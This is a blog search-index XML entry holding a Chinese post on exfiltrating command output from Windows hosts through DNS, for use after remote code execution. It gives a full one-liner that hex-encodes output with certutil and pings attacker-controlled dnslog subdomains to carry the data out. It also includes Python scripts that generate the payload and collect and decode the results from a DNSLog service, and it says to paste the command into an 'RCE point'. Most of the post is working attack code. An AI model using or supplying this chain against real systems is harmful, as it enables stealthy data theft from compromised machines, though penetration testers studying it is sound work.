<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windows下DNS出网的命令回显技巧</title>
      <link href="/2022/07/05/Windows%E4%B8%8BDNS%E5%87%BA%E7%BD%91%E7%9A%84%E5%91%BD%E4%BB%A4%E5%9B%9E%E6%98%BE%E6%8A%80%E5%B7%A7/"/>
      <url>/2022/07/05/Windows%E4%B8%8BDNS%E5%87%BA%E7%BD%91%E7%9A%84%E5%91%BD%E4%BB%A4%E5%9B%9E%E6%98%BE%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows下DNS出网的命令回显技巧"><a href="#Windows下DNS出网的命令回显技巧" class="headerlink" title="Windows下DNS出网的命令回显技巧"></a>Windows下DNS出网的命令回显技巧</h1><p>最近遇见了很多仅DNS出网的极限环境，简单研究了个还算通用的利用DNSLog的回显Trick，全当抛砖引玉，不喜勿喷。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在实战中，命令执行总能遇见各种各样的环境，无回显且仅DNS出网的环境也能占个大多数。仅DNS出网的环境一般利用编码+DNSLog就可以解决回显问题。</p><p>通用指的是在server2003（无powershell）环境也能用。</p><p>windows自带的encode只有certutil</p><p><img src="/img/artical/3/1.png"></p><p><img src="/img/artical/3/2.png"></p><p>certutil自带了base64和hex两种encode方法</p><h2 id="0x01-base64-encode存在的问题"><a href="#0x01-base64-encode存在的问题" class="headerlink" title="0x01 base64-encode存在的问题"></a>0x01 base64-encode存在的问题</h2><ul><li>特殊字符。+，/ （无powershell环境处理替换非常麻烦）</li><li>单行长度。dns域名长度限制63个。certutil-encode后单行字符长度为64，需要将一行分割为两段带出。（无powershell需要cmdshell套用循环操作，十分繁琐）</li></ul><p><img src="/img/artical/3/3.png"></p><ul><li>云服务器DNS问题</li></ul><p><img src="/img/artical/3/4.png"></p><p><strong>腾讯云的DNS服务器存在强转小写问题，手头没阿里服务器，不过测试了阿里的DNS（223.5.5.5）也存在一样的问题。</strong></p><p>以上原因在我研究的时候，最终放弃了base64-encode的方案。（尤其是最后一条强转小写的问题）</p><h2 id="0x02-hex-encode方案"><a href="#0x02-hex-encode方案" class="headerlink" title="0x02 hex-encode方案"></a>0x02 hex-encode方案</h2><p>先看encode结果。</p><p><img src="/img/artical/3/5.png"></p><p>对比base64的，主要优点：</p><ul><li>无特殊字符。</li><li>单行长度为32字符。</li><li>无需考虑大小写。</li><li><strong>无需考虑不同条数数据外带存在延时。</strong>（外带记录会带出前4位表示数据位置的字符：0000）</li></ul><p>但是一次dns只能带出来16个字符回显，效率有点低。</p><p>接下来只需要利用cmdshell语法，将中间的字符取出来即可。</p><pre><code class="tsx">for /f &quot;tokens=1-17&quot; %a in (result.txt) do echo %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q</code></pre><p><img src="/img/artical/3/6.png"></p><p>在encode的最后一行可能因为字符不足导致存在特殊字符：</p><p><img src="/img/artical/3/7.png"></p><p>在写入的命令txt后追加部分字符后再encode即可解决此问题。</p><p>just like:</p><pre><code class="powershell">ipconfig &gt; ipconfig &amp;&amp;echo 11111111111&gt;&gt;ipconfig</code></pre><p>最后一行DNSLog记录会以0d0a3131结尾，很容易判断了。</p><p>最终命令:</p><pre><code class="powershell">command &gt; command &amp;&amp;echo 11111111111&gt;&gt;command &amp;&amp; certutil -encodehex command command.txt &amp;&amp; for /f &quot;tokens=1-17&quot; %a in (command.txt) do start /b ping -nc 1 %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.command.dnslog.cn &amp;&amp; del command &amp;&amp; del command.txt </code></pre><h2 id="0x03-自动化食用"><a href="#0x03-自动化食用" class="headerlink" title="0x03 自动化食用"></a>0x03 自动化食用</h2><p>因为外带的数据条数实在太大，就顺便自动化下。</p><p>一个生成命令，另一个脚本用来监听dnslog平台并做格式化输出</p><p>CommandGen.py</p><pre><code class="python">import syscommandTem = r&#39;command &gt; command7 &amp;&amp;echo 11111111111&gt;&gt;command7 &amp;&amp; certutil -encodehex command7 command7.txt &amp;&amp; for /f &quot;tokens=1-17&quot; %a in (command7.txt) do start /b ping -nc 1 %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.command.&#123;0&#125; &amp;&amp; del command7 &amp;&amp; del command7.txt&#39;with open(&#39;config617&#39;, &#39;r&#39;) as f:    command = commandTem.format(f.readlines()[0])    if __name__ == &#39;__main__&#39;:    if len(sys.argv)&lt;2:        print(&#39;usage: python3 CommandGen.py Yourcommand No(start)&#39;)        print(&#39;like: python3 CommandGen.py whoami (Command will use &quot;start&quot;.Start will Send a large number of requests in a short period of time, resulting in lost DNSLog record)&#39;)        print(&#39;like: python3 CommandGen.py whoami no (Will No start)&#39;)        sys.exit(0)    if len(sys.argv) == 2:        print(command.replace(&#39;command&#39;,sys.argv[1]))    else:        print(command.replace(&#39;command&#39;,sys.argv[1]).replace(&#39;start /b&#39;,&#39;&#39;))</code></pre><p>hexDnsEcho.py</p><pre><code class="python">import timeimport requestsimport jsonimport binasciirequestTime = 6 # DNSLog platform interval per requestcommandHex = &#123;&#125;# initialize the configurationdef get_new_config():    global domain,token,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce    url = &#39;http://dig.pm/new_gen&#39;    data = &#123; &#39;domain&#39; : &#39;dns.1433.eu.org.&#39; &#125;    dataResult = json.loads(requests.post(url, data=data).text)    domain = dataResult[&#39;domain&#39;]    token = dataResult[&#39;token&#39;]    with open(&#39;config617&#39;,&#39;w&#39;) as f:        f.write(dataResult[&#39;domain&#39;])    lastFinishTime = time.strftime(&quot;%Y-%m-%d %X&quot;, time.localtime()) # record last finish time    commandStartPos = 0    commandEndPos = 0    lastRecordLen = 0    finishOnce = False    # get DNSLog data def get_dnslogdata() -&gt; list:    if commandStartPos and commandEndFlag:         commandHex[commandName].extend([result[length-1][1][&#39;subdomain&#39;]                                         for length in range(len(result),commandStartPos,-1)                                         if result[length-1][1][&#39;subdomain&#39;].count(&#39;.&#39;) == 7])                                        # Get the command part of the DNSLog data        tempList = []        for length in range(commandStartPos,-1,-1):            if result[length-1][1][&#39;time&#39;] &lt; lastFinishTime:break            if result[length-1][1][&#39;subdomain&#39;].count(&#39;.&#39;) == 7:                tempList.append(result[length-1][1][&#39;subdomain&#39;])         commandHex[commandName].extend(tempList)        return commandHex[commandName]# deal with DNSlog data, Format the outputdef deal_data(data: list):    global finishOnce    if commandStartPos and commandEndFlag:        for length in range(commandStartPos,-1,-1):            if result[length-1][1][&#39;time&#39;] &lt; lastFinishTime:break            if result[length-1][1][&#39;subdomain&#39;].count(&#39;.&#39;) == 7:                commandHex[commandName].append(result[length-1][1][&#39;subdomain&#39;])        try:            hexCommand = &#123; item[:4] : item[4:] for item in commandHex[commandName] &#125;             hexCommand = sorted(hexCommand.items(), key=lambda x: int(x[0], 16))            hexCommand = [ item[1][:32] for item in hexCommand]        except:            print(&#39;!!!!Error Command format! Try to find DNSLog site(http://dig.pm/get_results) to get conntent..&#39;)            pass        hexCommand[-1] = &#39;&#39;.join(hexCommand[-1].split(&#39;0d0a&#39;)[:-1])        commandResult = &#39;&#39;.join(hexCommand)        #print(commandResult)        print(&#39;\n----Command Result----&#39;)        Head = &#39;\033[36m&#39;        End = &#39;\033[0m&#39;        try:            print(Head + binascii.a2b_hex(commandResult).decode(&#39;gb2312&#39;) + End)        except:            print(&#39;Maybe use START to execute commands and cause DNSLog records to be lost..\nIt is recommended to remove START from the command&#39;)        print(&#39;----Get Result End!----&#39;)        finishOnce = Trueif __name__ == &#39;__main__&#39;:    get_new_config()    while True:        if finishOnce:               get_new_config()        for i in range(requestTime,-1,-1):            print(&#39;\r&#39;, &#39;Wait DNSLog data: &#123;&#125;s...&#39;.format(str(i)), end=&#39;&#39;)             time.sleep(1)           try:            data = &#123; &#39;domain&#39;:domain, &#39;token&#39;:token &#125;            url = &#39;http://dig.pm/get_results&#39;            #proxies = &#123; &#39;http&#39;:&#39;http://127.0.0.1:8080&#39; &#125;            result = json.loads(requests.post(url, data=data, proxies=False).text)             result = sorted(result.items(), key=lambda x: int(x[0]))        except:            print(&#39;\r&#39;, &#39;Not Find DNSLog Result!&#39;, end=&#39;&#39;)            continue                commandStartFlag = 1 if lastRecordLen == len(result) else 0        lastRecordLen = len(result)        commandEndFlag = 1 if commandEndPos == len(result) else 0         commandEndPos = len(result)                if not commandStartPos and ((result[-1][1][&#39;subdomain&#39;].count(&#39;.&#39;))  == 7 or                                     commandStartFlag):                                     # judge if the DNSLog recording is start            if result[-1][1][&#39;time&#39;] &lt; lastFinishTime:                 print(&#39;\r&#39;, &#39;Not Find DNSLog Result!&#39;, end=&#39;&#39;)                continue                                 commandStartPos = len(result)            commandName = result[-1][1][&#39;subdomain&#39;].split(&#39;.&#39;)[1]            print(&#39;\nFinding Command Record!&#39;)            print(&#39;----Command: \033[36m&#123;&#125;\033[0m----&#39;.format(commandName))            commandHex[commandName] = []             print(&#39;Waiting Command DNSLog Record Finish...&#39;)           if commandStartPos and ((result[-1][1][&#39;subdomain&#39;].count(&#39;.&#39;)) != 7 or                                 commandEndFlag):                                # judge if the DNSLog recording is over            commandEndFlag = 1            #print(&#39;Command DNSLog Record Finish...&#39;)           dataList = get_dnslogdata()        deal_data(dataList)</code></pre><p>用法：</p><p>先运行hexDnsEcho.py，然后运行CommandGen.py生成命令，将生成的命令填写进入RCE点即可。</p><p><img src="/img/artical/3/11.png"></p><p>最终效果</p><p><img src="/img/artical/3/12.png"></p><p><img src="/img/artical/3/13.png"></p><h2 id="0x04-后续"><a href="#0x04-后续" class="headerlink" title="0x04 后续"></a>0x04 后续</h2><p><strong>研究这个trick还是花了几天时间的，主要是windows的cmd的实现的操作实在是有限，爬了好几天的论坛，要是有师傅们有更好的方法和思路可以再研究交流一波。</strong></p><p><strong>本文全当抛砖引玉，代码也是随手写的，质量不高，不喜勿喷，有问题也欢迎各位师傅指出。</strong></p><p>最后吐槽一下我用的这个DNSLog平台的逆天排序</p><p><img src="/img/artical/3/14.png"></p><p>Code: <a href="https://github.com/Dr-S1x17/NoNetCmdEcho-FileW.e">https://github.com/Dr-S1x17/NoNetCmdEcho-FileW.e</a></p><p>参考链接：<a href="http://www.bathome.net/">http://www.bathome.net</a></p>]]></content>
      
      
      <categories>
          
          <category> 奇技淫巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
